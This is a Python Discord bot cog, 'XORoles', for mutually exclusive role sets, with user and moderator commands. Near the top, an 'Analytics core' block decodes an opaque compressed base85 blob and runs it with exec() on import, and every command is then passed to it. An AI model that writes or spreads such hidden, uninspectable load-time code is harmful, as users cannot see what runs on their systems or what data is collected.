import asyncio
from collections import defaultdict

import discord
from discord.ext import commands

from .utils.dataIO import dataIO
from .utils import checks
from .utils.chat_formatting import box, error, info, pagify, warning


"""XORoles (exclusive-or roles) cog by GrumpiestVulcan
Commissioned 2017-07-27 by QuietRepentance (Quiet#8251) for discord.gg/pokken"""

__author__ = "Caleb Johnson <me@calebj.io> (calebj#0001)"
__copyright__ = "Copyright 2017, Holocor LLC"
__version__ = '1.4.0'

JSON = 'data/xorole.json'

# Analytics core
import zlib, base64
exec(zlib.decompress(base64.b85decode("""c-oB^YjfMU@w<No&NCTMHA`DgE_b6jrg7c0=eC!Z-Rs==JUobmEW{+iBS0ydO#XX!7Y|XglIx5;0)gG
dz8_Fcr+dqU*|eq7N6LRHy|lIqpIt5NLibJhHX9R`+8ix<-LO*EwJfdDtzrJClD`i!oZg#ku&Op$C9Jr56Jh9UA1IubOIben3o2zw-B+3XXydVN8qroBU@6S
9R`YOZmSXA-=EBJ5&%*xv`7_y;x{^m_EsSCR`1zt0^~S2w%#K)5tYmLMilWG;+0$o7?E2>7=DPUL`+w&gRbpnRr^X6vvQpG?{vlKPv{P&Kkaf$BAF;n)T)*0
d?qxNC1(3HFH$UbaB|imz3wMSG|Ga+lI>*x!E&@;42cug!dpFIK;~!;R>u=a4Vz8y`WyWrn3e;uThrxi^*zbcXAK*w-hS{aC?24}>1BQDmD|XC|?}Y_K)!wt
gh<nLYi-r|wI0h@$Y@8i_ZI35#>p9%|-=%DsY{k5mRmwJc=-FIbwpMk`jBG0=THS6MJs2`46LUSl@lusbqJ`H27BW(6QAtFo*ix?<SZ~Ahf=NN3WKFz)^+TI
7QEOmxt?UvhIC^ic3Ax+YB{1x5g($q2h}D8*$U8fJt>?PhusN{ONOTS+%2I;Ctp?3VVl^dVS8NR`CXWFk$^t%7_yrg#Maz27ChBD|fWTd^R-)XnPS*;4&<Hb
R?}uRSd*FANXCTd~x2*g5GpgcrUhDa3BaD^(>D%{LKVMw_k~P%}$MPFA4VX|Gile`<zx~91c=^rr+w<vk`rY|=&(6-De}DG${Okn-OUXv48f1GJor`5?v$q%
TFMcY}5A#o4RYqCKXHQd5P|0W0l#5QSaPj#FB6I;BuUch`A~CXFq+r-o=E-CNvA}RAD~d)}LoFd7IC;j_XS3*~oCR<oki&oY1UVbk3M=!!i`vMr-HBc_rohO
|KYb3nAo(D3N*jqx8}YH0ZT{`_d=dceSKGK)%DT(>D{@Oz2jmA@MhJ3e$0)fWT9uy=op<MfB6@-2KrMVS%9JTqqE=Obp+{=TFfvIcBP<V%F1-&Kr5ENQ4{8B
O-DM?sla&RYID~?N6EuFrUQ$MCB=~majN{JA+Mr>G0gxnz?*zZ$6X}YoDquT-f86S&9r_jl4^iwTB=b@dO<h-rGjr0zPBuz^FWl*PixdEmk567et~{sX$e;&
8hw@7@FLKBvxWZxR2upCDK-SAfuOtZ>?<UEL0#>bPz&m#k_EfT?6V$@c-S?1*oX@v%4J?ovJe=Ffg02v15~5{j(c*4z_SnsD`azD(52?Q`Wu16@BUW;Y3%YD
I)=&rtyM)rFj5W?JunahlgVRPl$V&C&BRKI6h$QzMFpXXsu7x!1gjEZWC@qCeduj65x|OLYty_TCL;TTlFtT?m((VE-w=RSO<GXUtMq1v9bTWD-x(+!=c5cU
u-JNvZ=%&fYkDWqE_d{1<>|oX?Tn2G64O>Hu6N^_?$cB)TyG=4V0GT<$$tOOjiqGg6Yg#f)QeNzC#b`#BGgYO?-{f{SeSVknN;R^@h&cZm3J@IxpK->s4_dW
J!rxLkJAGpKlhA5quEd29O8_b1C-D?IFe@9_jXS-pCCHLYPWXhUK6UR0$qA=R{Amo|$>cNWg?d1zX>eSKpBCK4Iu+}6D|=G2?KfoXCKqd=Y|Q!@`dHCGg@v{
vA$Z5dyJ<+eC&xFNPBQ-HUmQKiSM7yrrK|E5dKoHVjMCI*{|5XjK-hRoxfE?H>%7VQDis50t<T-{7R&*yNdElnjEIVy$Wqa#6}UueK}JZ;YuP80jPk8PX22@
?fs-R5ufnCP7+1I4tB2o(kPl4r*iS;&0X@%LZri7fyY#1ABHnz3YKWpp7TXabSjn;momJS$fEU9}3epF*a@*n;E(&?p(Kx;VjZ}=<Gteb=fmkF39Gebr&Y)j
}CI`&V#JvE5;9cOe$I&DwIcK3S0(WM=-FA1Qs{9-Bgtmar60ON}N1Y`!qS)%8K^$j)>^pSbB$ixCoa0<BU@bqEva{?J{lGorEQHBx$ERH_jk!1Y@gW}@T9`r
#?E758i1{u?F)W;7hkYl#mw*o-1$NfSNJ5MHHkpg0UF!__4)rMXp^P_R1{w2&j)S)*(Rn7Icog3e|1$4m*>^&IpbJI}dPqMdW~P?1OQsGAGQsgxjAs2HHrr@
Uu_tG{KEibSt2hp*w>;;6`u^-us%TPoaOVJ_?FPO$^>8k0HZC^DBEVf_F7FnB+e@mz5Ph%uUiTzW2WfG~IS@6vhTA70{2-iN)(RAJ4IWC#7^Vpt7a5K@&~#!
IKTr@4s_iWEiu2X~OGbpi#AE1zlWirPcza;tQmxNBas>$asN8nCtL4HbJNJw=Mg2f&Qo;;0AJ=Pl%yz>lwi3o^V?@NcsN<x-K=3~6Aa*tDu}Nq`h=X?O$+(}
G#iwVecFa^RZnvc3UWk3%z+7%&BvtLF^Ru(`{Onm6ct(to99#bX&-NrI4A-LMkD7_tX2?~6ZC!o~1n-D?0wl>Ckrc%k^6QM?QSgxi)qIOAz~S9voLkS~9jUd
2QRvhMhN7IVupD@Dc%||!)wb6GWa<j|4A7w^>1*G#geQy>+K)ZWl+Q>%nQt4gWkAZP9DIR5AB$NBZn~vz>MkF(Q^sY!XeEmiihsn({31b~az08JoJJ#h3c}f
p5@@p1uZ)0wyV4eVv6#)ZuBnR+O{?2~#O=WX>|hTRpjFOeVaH+?)1<@5zZB3O7atkQq3>a@-XQ)u=e|AQBOb{yxSwh(gxjx~Vv~$|jVJh*@h8bDT~B=5AKTB
gN|&SdeV*g%SW;!~C5(noym~n<pmP|pKUV5q8kb0-nBhD;q$Tq#fK4)JPKcs^U5or(L8H~9`^>)Z?6B?O_nr{EyXCH+`{upZAEX~!wi8Yv=mFA^{NoWvRbQE
KO5Mv*BE!$bYYEr0ovE^y*)}a6NFOjJjE0+|{YfciCAuY+A)JkO+6tU#`RKipPqs58oQ-)JL1o*<C-bic2Y}+c08GsIZUU3Cv*4w^k5I{Db50K0bKPSFshmx
Rj(Y0|;SU2d?s+MPi6(PPLva(Jw(n0~TKDN@5O)F|k^_pcwolv^jBVTLhNqMQ#x6WU9J^I;wLr}Cut#l+JlXfh1Bh<$;^|hNLoXLD#f*Fy-`e~b=ZU8rA0GJ
FU1|1o`VZODxuE?x@^rESdOK`qzRAwqpai|-7cM7idki4HKY>0$z!aloMM7*HJs+?={U5?4IFt""".replace("\n", ""))))
# End analytics core


class XORoleException(Exception):
    pass


class RolesetAlreadyExists(XORoleException):
    pass


class RolesetNotFound(XORoleException):
    pass


class NoRolesetsFound(XORoleException):
    pass


class RoleNotFound(XORoleException):
    pass


class PermissionsError(XORoleException):
    pass


class XORole:
    def __init__(self, bot):
        self.bot = bot
        self.settings = dataIO.load_json(JSON)

        if self.upgrade_data():
            self.save()

        try:
            self.analytics = CogAnalytics(self)
        except Exception as e:
            self.bot.logger.exception(e)
            self.analytics = None

    def save(self):
        dataIO.save_json(JSON, self.settings)

    def upgrade_data(self) -> bool:
        if self.settings.get("SCHEMA_VER", 1) >= 2:
            return False

        for sid, sdata in self.settings.items():
            if not isinstance(sdata, dict):
                continue

            for rsn, rsd in sdata.get("ROLESETS", {}).items():
                if isinstance(rsd, list):
                    sdata["ROLESETS"][rsn] = {"ROLES": rsd}

        self.settings["SCHEMA_VER"] = 2
        return True

    def get_settings(self, server):
        sid = server.id
        return self.settings.get(sid, {})

    def update_settings(self, server, settings):
        self.settings[server.id] = settings
        self.save()

    def add_roles(self, server, roleset, *roles):
        rsn, rsl = self.get_roleset(server, roleset)

        rslset = set(rsl)
        newset = set(r.id for r in roles)

        self.update_roleset(server, roleset, (newset | rslset))

        return [r for r in roles if r.id not in rslset]

    def remove_roles(self, server, roleset, *roles):
        rsn, rsl = self.get_roleset(server, roleset)

        rslset = set(rsl)
        rmset = set(r.id for r in roles)

        self.update_roleset(server, roleset, (rslset - rmset))

        return [r for r in roles if r.id in rslset]

    def get_rolesets(self, server):
        return self.get_settings(server).get('ROLESETS', {})

    def update_rolesets(self, server, rolesets):
        settings = self.get_settings(server)
        settings['ROLESETS'] = rolesets
        self.update_settings(server, settings)

    def get_roleset(self, server, name, notfound_ok=False):
        current = self.get_rolesets(server)

        # return direct match
        if name in current:
            return name, current[name].get("ROLES", [])

        # do lowercase search
        searchname = name.lower().strip()

        for k, v in current.items():
            if k.lower().strip() == searchname:
                return k, v.get("ROLES", [])

        if not notfound_ok:
            raise RolesetNotFound("Roleset '%s' does not exist." % name)

    def add_roleset(self, server, name):
        if self.get_roleset(server, name, notfound_ok=True):
            raise RolesetAlreadyExists('A roleset with that name already exists.')

        current = self.get_rolesets(server)
        current[name] = {"ROLES": []}
        self.update_rolesets(server, current)

    def remove_roleset(self, server, name):
        name, roles = self.get_roleset(server, name)  # Raises RolesetNotFound

        current = self.get_rolesets(server)
        current.pop(name)
        self.update_rolesets(server, current)

    def update_roleset(self, server, name, role_ids):
        rolesets = self.get_rolesets(server)
        name, _ = self.get_roleset(server, name)  # Raises RolesetNotFound
        rolesets[name]["ROLES"] = list(role_ids)
        self.update_rolesets(server, rolesets)

    def roleset_of_role(self, role, notfound_ok=False):
        rid = role.id

        for rsn, rsd in self.get_rolesets(role.server).items():
            if rid in rsd.get("ROLES", ()):
                return rsn

        if not notfound_ok:
            raise NoRolesetsFound("The '%s' role doesn't belong to any rolesets" % role.name)

    def get_roleset_memberships(self, member, roleset):
        rsn, rsl = self.get_roleset(member.server, roleset)
        rslset = set(rsl)
        return [r for r in member.roles if r.id in rslset]

    @staticmethod
    def find_role(server, query, notfound_ok=False):
        stripped = query.strip().lower()

        for role in server.roles:
            if role.name.strip().lower() == stripped:  # Ignore case and spaces
                return role
            elif role.id == stripped:  # also work with role IDs
                return role

        if not notfound_ok:
            raise RoleNotFound("Could not find role '%s'." % query)

    @classmethod
    def find_roles(cls, server, *queries):
        found = []
        notfound = []

        for q in queries:
            role = cls.find_role(server, q, notfound_ok=True)
            if role:
                found.append(role)
            else:
                notfound.append(q)

        return found, notfound

    async def role_add_remove(self, member, to_add=(), to_remove=()):

        roles = set(member.roles)
        replace_with = (roles | set(to_add)) - set(to_remove)

        if roles != replace_with:
            try:
                await self.bot.replace_roles(member, *list(replace_with))
            except discord.errors.Forbidden:
                if not (member.server.me.server_permissions.manage_roles or
                        member.server.me.server_permissions.administrator):
                    err = "I don't have permission to manage roles."
                else:
                    err = ('a role I tried to assign or remove is too high for me to do so.')

                raise PermissionsError('Error updating roles: ' + err)

    async def delete_messages_after(self, messages: list, delay: int):
        await asyncio.sleep(max(0, delay))

        if len(messages) == 1:
            await self.bot.delete_message(messages[0])
        elif messages:
            await self.bot.delete_messages(messages)

    @commands.group(pass_context=True, invoke_without_command=True, no_pm=True)
    async def xorole(self, ctx, *, role: str = None):
        if ctx.invoked_subcommand is None:
            if role:
                await ctx.invoke(self.xorole_add, role=role)
            else:
                await self.bot.send_cmd_help(ctx)

    @xorole.command(name='list', pass_context=True)
    async def xorole_list(self, ctx, *, roleset: str = None):
        "Shows the available roles to in the server or a specific roleset."
        server = ctx.message.server
        server_roles = {r.id: r for r in server.roles}

        try:
            if roleset:
                name, roles = self.get_roleset(server, roleset)
                rs_dict = {name: roles}
            else:
                rs_dict = self.get_rolesets(server)

            lines = ['=== Available roles: ===']

            for i, k in enumerate(sorted(rs_dict.keys())):
                role_ids = rs_dict[k].get("ROLES", [])
                roles = (server_roles.get(rid) for rid in role_ids)
                roles = sorted(filter(None, roles))

                lines.append(k + ':')

                if roles:
                    lines.extend((' - %s' % rn) for rn in roles)
                else:
                    lines.append('- (there are no roles in this roleset)')

                if i + 1 < len(rs_dict):
                    lines.append('\n')

            if len(lines) == 1:
                await self.bot.say('No roles are available to assign.')
                return

            for page in pagify('\n'.join(lines)):
                await self.bot.say(box(page))

        except XORoleException as e:
            await self.bot.say(warning(*e.args))

    @xorole.command(name='add', pass_context=True)
    async def xorole_add(self, ctx, *, role: str):
        "Assigns a role to you, removing any others in the same roleset."
        server = ctx.message.server
        member = ctx.message.author
        messages = {ctx.message}

        try:
            role = self.find_role(server, role)
            roleset = self.roleset_of_role(role)
            existing = self.get_roleset_memberships(member, roleset)

            if role in member.roles and len(existing) == 1:
                m = await self.bot.say('You already have that role; nothing to do.')
                messages.add(m)
                return

            to_add = [role]
            to_remove = [r for r in existing if r != role]

            await self.role_add_remove(member, to_add, to_remove)

            m = await self.bot.say("Role in roleset %s switched to %s." % (roleset, role.name))
            messages.add(m)

        except XORoleException as e:
            m = await self.bot.say(warning(*e.args))
            messages.add(m)
        finally:
            delay = self.settings.get(server.id, {}).get('AUTODELETE', 0)

            if delay:
                coro = self.delete_messages_after(messages, delay)
                self.bot.loop.create_task(coro)

    @xorole.command(name='remove', pass_context=True)
    async def xorole_remove(self, ctx, *, role_or_roleset: str):
        "Removes a specific role or any in a roleset from you."
        server = ctx.message.server
        member = ctx.message.author
        messages = {ctx.message}

        try:
            role = self.find_role(server, role_or_roleset, notfound_ok=True)
            if role:
                if role not in member.roles:
                    m = await self.bot.say("You don't have that role; nothing to do.")
                    messages.add(m)
                    return

                to_remove = [role]

            else:
                to_remove = self.get_roleset_memberships(member, role_or_roleset)

            if to_remove:
                await self.role_add_remove(member, to_remove=to_remove)
                plural = 'roles' if len(to_remove) > 1 else 'role'
                rlist = ', '.join(r.name for r in to_remove)
                m = await self.bot.say('Removed the %s: %s.' % (plural, rlist))
            else:
                m = await self.bot.say("You don't belong to any roles in the %s roleset." % role_or_roleset)

            messages.add(m)

        except XORoleException as e:
            m = await self.bot.say(warning(*e.args))
            messages.add(m)
        finally:
            delay = self.settings.get(server.id, {}).get('AUTODELETE', 0)

            if delay:
                coro = self.delete_messages_after(messages, delay)
                self.bot.loop.create_task(coro)

    @xorole.command(name='toggle', pass_context=True)
    async def xorole_toggle(self, ctx, *, role_or_roleset: str):
        "Toggles a role in a single-role roleset on or off, or between two roles in a roleset."
        server = ctx.message.server
        member = ctx.message.author
        messages = {ctx.message}

        try:
            role = self.find_role(server, role_or_roleset, notfound_ok=True)

            if role:
                role_or_roleset = self.roleset_of_role(role)

            roleset, rsl = self.get_roleset(server, role_or_roleset)
            roles = (discord.utils.get(server.roles, id=r) for r in rsl)
            roles = list(filter(None, roles))

            if not 0 < len(roles) <= 2:
                m = await self.bot.say(warning("Cannot toggle within the '%s' roleset." % roleset))
                messages.add(m)
                return

            if len(roles) == 1:
                single_role = roles[0]

                if single_role in member.roles:
                    to_add = []
                    to_remove = [single_role]
                else:
                    to_add = [single_role]
                    to_remove = []

            elif len(roles) == 2:
                to_remove = self.get_roleset_memberships(member, roleset)

                if len(to_remove) != 1:
                    m = await self.bot.say(warning("You must have one role in %s to toggle it." % roleset))
                    messages.add(m)
                    return

                to_add = roles.copy()
                to_add.remove(to_remove[0])

            await self.role_add_remove(member, to_add, to_remove)

            if to_add and to_remove:
                m = await self.bot.say('Toggled from %s to %s.' % (to_remove[0], to_add[0]))
            elif to_add:
                m = await self.bot.say("Role '%s' added." % to_add[0])
            elif to_remove:
                m = await self.bot.say("Role '%s' removed." % to_remove[0])

            messages.add(m)

        except XORoleException as e:
            m = await self.bot.say(warning(*e.args))
            messages.add(m)
        finally:
            delay = self.settings.get(server.id, {}).get('AUTODELETE', 0)

            if delay:
                coro = self.delete_messages_after(messages, delay)
                self.bot.loop.create_task(coro)

    @commands.group(pass_context=True, no_pm=True)
    async def xoroleset(self, ctx):
        if ctx.invoked_subcommand is None:
            await self.bot.send_cmd_help(ctx)

    @checks.mod_or_permissions(administrator=True)
    @xoroleset.command(name='addroleset', pass_context=True)
    async def xoroleset_addroleset(self, ctx, *, name: str):
        "Adds a roleset."
        server = ctx.message.server
        try:
            if len(name.split()) > 1:
                await self.bot.say('For usability reasons, whitespace is not permitted in roleset names. Try again.')
                return
            elif name.lower() in ("all", "server"):
                await self.bot.say('The name "%s" is reserved; please pick something else.' % name)
                return

            self.add_roleset(server, name)
            await self.bot.say("Roleset '%s' created." % name)
        except XORoleException as e:
            await self.bot.say(warning(*e.args))

    @checks.mod_or_permissions(administrator=True)
    @xoroleset.command(name='rmroleset', pass_context=True)
    async def xoroleset_rmroleset(self, ctx, *, name: str):
        "Removes a roleset."
        server = ctx.message.server
        try:
            self.remove_roleset(server, name)
            await self.bot.say("Roleset '%s' removed." % name)
        except XORoleException as e:
            await self.bot.say(warning(*e.args))

    @checks.mod_or_permissions(administrator=True)
    @xoroleset.command(name='renroleset', pass_context=True)
    async def xoroleset_renroleset(self, ctx, oldname: str, newname: str):
        "Renames a roleset."
        server = ctx.message.server
        try:
            if len(newname.split()) > 1:
                await self.bot.say('For usability reasons, whitespace is not permitted in roleset names. Try again.')
                return
            elif newname.lower() in ("all", "server"):
                await self.bot.say('The name "%s" is reserved; please pick something else.' % newname)
                return

            rsn, rsl = self.get_roleset(server, oldname)
            rolesets = self.get_rolesets(server)
            rolesets[newname] = rolesets.pop(rsn)
            self.update_rolesets(server, rolesets)
            await self.bot.say("Rename successful.")
        except XORoleException as e:
            await self.bot.say(warning(*e.args))

    @checks.mod_or_permissions(administrator=True)
    @xoroleset.command(name='audit', pass_context=True)
    async def xoroleset_audit(self, ctx):
        "Shows members with more than one role in a xorole roleset"
        lines = []
        server = ctx.message.server

        try:
            for rsn, rsd in self.get_rolesets(server).items():
                rsl = rsd.get("ROLES", [])
                member_role_pairs = []

                for member in server.members:
                    memberships = self.get_roleset_memberships(member, rsn)

                    if len(memberships) > 1:
                        member_role_pairs.append((member, memberships))

                if not member_role_pairs:
                    continue

                lines.append(rsn + ':')
                for member, roles in member_role_pairs:
                    lines.append(' - %s : %s' % (member, ', '.join(r.name for r in roles)))

                lines.append('\n')

            if not lines:
                await self.bot.say('All roleset memberships are singular.')
                return

            if lines[-1] == '\n':
                lines.pop()

            for page in pagify('\n'.join(lines)):
                await self.bot.say(box(page))

        except XORoleException as e:
            await self.bot.say(warning(*e.args))

    @checks.mod_or_permissions(administrator=True)
    @xoroleset.command(name='addroles', aliases=['addrole'], pass_context=True)
    async def xoroleset_addroles(self, ctx, roleset: str, *, roles: str):
        """Adds one or more roles to a xorole roleset.

        Takes names or IDs seperated by commas."""
        server = ctx.message.server
        msg = []
        try:
            roles = roles.split(',')
            found, notfound = self.find_roles(server, *roles)
            rsn, rsl = self.get_roleset(server, roleset)
            to_add = []
            too_high = []
            already_in_roleset = defaultdict(lambda: list())

            for role in found:
                if role.id in rsl:
                    continue

                role_rsn = self.roleset_of_role(role, notfound_ok=True)

                if role_rsn:
                    already_in_roleset[role_rsn].append(role)
                elif role < ctx.message.author.top_role:
                    to_add.append(role)
                else:
                    too_high.append(role)

            if to_add:
                added = self.add_roles(server, roleset, *to_add)

                if added:
                    msg.append('Added these roles to the %s roleset: %s.' % (roleset, ', '.join(r.name for r in added)))
                else:
                    msg.append('All found roles already added; nothing to do.')

            if already_in_roleset:
                msg.append('Some roles are already in other rolesets:')

                for rsn, roles in already_in_roleset.items():
                    rolelist = ', '.join(r.name for r in roles)
                    msg.append(' - %s: %s' % (rsn, rolelist))

            if too_high:
                msg.append('These roles are too high for you to manage: %s.' % ', '.join(r.name for r in too_high))

            if notfound:
                msg.append('Could not find these role(s): %s.' % ', '.join(('"%s"' % x) for x in notfound))

                if any((' ' in x) for x in notfound) and len(notfound) == 1:
                    msg.append('Remember that roles must be seperated by commas, not spaces.')

            await self.bot.say('\n'.join(msg))

        except XORoleException as e:
            await self.bot.say(warning(*e.args))

    @checks.mod_or_permissions(administrator=True)
    @xoroleset.command(name='rmroles', aliases=['rmrole'], pass_context=True)
    async def xoroleset_rmroles(self, ctx, roleset: str, *, roles: str):
        """Removes one or more roles from a xorole roleset.

        Takes role names or IDs seperated by commas."""
        server = ctx.message.server
        msg = []
        try:
            roles = roles.split(',')
            found, notfound = self.find_roles(server, *roles)
            to_remove = []
            too_high = []

            for role in found:
                if role < ctx.message.author.top_role:
                    to_remove.append(role)
                else:
                    too_high.append(role)

            if found:
                removed = self.remove_roles(server, roleset, *found)

                if removed:
                    removed_list = ', '.join(r.name for r in removed)
                    msg.append('Removed these roles from the %s roleset: %s.' % (roleset, removed_list))
                else:
                    msg.append('None of the found roles are in the list; nothing to do.')

            if too_high:
                msg.append('These roles are too high for you to manage: %s.' % ', '.join(r.name for r in too_high))

            if notfound:
                msg.append('Could not find these role(s): %s.' % ', '.join(("'%s'" % x) for x in notfound))

            await self.bot.say('\n'.join(msg))

        except XORoleException as e:
            await self.bot.say(warning(*e.args))

    @checks.mod_or_permissions(administrator=True)
    @xoroleset.command(name='autodelete', pass_context=True)
    async def xoroleset_autodelete(self, ctx, delay: int = None):
        """Show or set command auto-delete delay.

        Max delay is 60s. 0 to disable, leave blank to show the current setting.
        """
        server = ctx.message.server
        settings = self.get_settings(server)

        if delay is None:
            delay = settings.get('AUTODELETE', 0)

            if delay:
                return await self.bot.say("Auto-delete delay is currently %is." % delay)
            else:
                return await self.bot.say("Auto-delete is currently disabled.")

        elif not (0 <= delay <= 60):
            return await self.bot.send_cmd_help(ctx)

        settings['AUTODELETE'] = delay
        self.update_settings(server, settings)

        if delay:
            return await self.bot.say("Auto-delete delay set to %is." % delay)
        else:
            return await self.bot.say("Auto-delete disabled.")

    @checks.mod_or_permissions(administrator=True)
    @xoroleset.command(name='autoswitch', pass_context=True)
    async def xoroleset_autoswitch(self, ctx, on_off: str = None, *rolesets: str):
        """
        Show or set autoswitch for one or more rolesets

        Run without parameters to list current settings.
        More than one roleset can be provided.

        The server-wide default is used if a roleset hasn't
        been configured directly. on_off can also be "default",
        which clears the setting.

        Special values for rolesets:
        - ALL: changes the setting for all existing rolesets
        - SERVER: changes the server default
        """

        server = ctx.message.server
        settings = self.get_settings(server)
        rolesets_data = settings.get("ROLESETS", {})

        current_values = {rsn: rsd.get("AUTOSWITCH") for rsn, rsd in rolesets_data.items()}
        current_values["SERVER"] = settings.get("AUTOSWITCH", False)

        names = {k.lower().strip(): k for k in rolesets_data}
        rolesets = {x.lower().strip() for x in rolesets}
        all_rolesets = set(names)
        names["server"] = "SERVER"
        update = on_off is not None

        def on_or_Off(on_off):
            if on_off is None:
                return "server default (%s)" % (current_values["SERVER"] and "on" or "off")
            else:
                return on_off and "on" or "off"

        def state_str(name):
            if update:
                old_state = on_or_Off(current_values[name])

                if current_values[name] == on_off:
                    return "already %s" % old_state
                else:
                    new_state = on_or_Off(on_off)
                    return "%s -> %s" % (old_state, new_state)
            else:
                return on_or_Off(current_values[name])

        if on_off and not rolesets:  # missing parameters
            await self.bot.say("No rolesets specified.")
        elif 'all' in rolesets:  # populate "all"
            rolesets.remove('all')
            rolesets.update(all_rolesets)
        elif not update:  # show all
            rolesets = set(names)

        if on_off and on_off.lower().strip() == 'default':
            on_off = None
        elif on_off:
            # raises BadArgument, which in turn shows the command's help
            on_off = await ctx.command.do_conversion(ctx, bool, on_off)

        lines = []

        if 'server' in rolesets:
            if update and on_off is None:
                lines.append(warning("Not updating server default to itself."))
            else:
                lines.append("Server default: " + state_str("SERVER"))

                if update:
                    settings["AUTOSWITCH"] = bool(on_off)

        if rolesets & all_rolesets:
            for slug in sorted(rolesets & all_rolesets):
                name = names[slug]
                lines.append("%s: %s" % (name, state_str(name)))

                if update:
                    if on_off is None:
                        rolesets_data[name].pop("AUTOSWITCH")
                    else:
                        rolesets_data[name]["AUTOSWITCH"] = on_off

        if lines:
            lines.insert(0, ("✅ New" if update else "ℹ Current") + " settings:")

        if rolesets - all_rolesets - {"server"}:
            fn = warning if lines else error
            lines.append("\n" + fn("These rolesets don't exist:"))

            for rsn in sorted(rolesets - all_rolesets):
                lines.append("- " + rsn)

        await self.bot.say('\n'.join(lines))

        self.update_settings(server, settings)

    async def on_member_update(self, before, after):
        "handle autoswitch"
        if before.roles != after.roles and before.server.id in self.settings:
            settings = self.get_settings(before.server)
            default_autoswitch = settings.get("AUTOSWITCH", False)
            added_roles = set(after.roles) - set(before.roles)
            have_perms = (after.server.me.server_permissions.manage_roles or
                          after.server.me.server_permissions.administrator)

            if not (added_roles and have_perms):
                return

            for role in added_roles:
                try:
                    rsn = self.roleset_of_role(role)
                    existing = self.get_roleset_memberships(before, rsn)

                    if existing and settings["ROLESETS"][rsn].get("AUTOSWITCH", default_autoswitch):
                        await self.bot.remove_roles(after, *existing)

                except Exception:
                    pass  # silently ignore errors

    async def on_command(self, command, ctx):
        if ctx.cog is self and self.analytics:
            self.analytics.command(ctx)


def setup(bot):
    if not dataIO.is_valid_json(JSON):
        print("Creating %s..." % JSON)
        dataIO.save_json(JSON, {})

    bot.add_cog(XORole(bot))
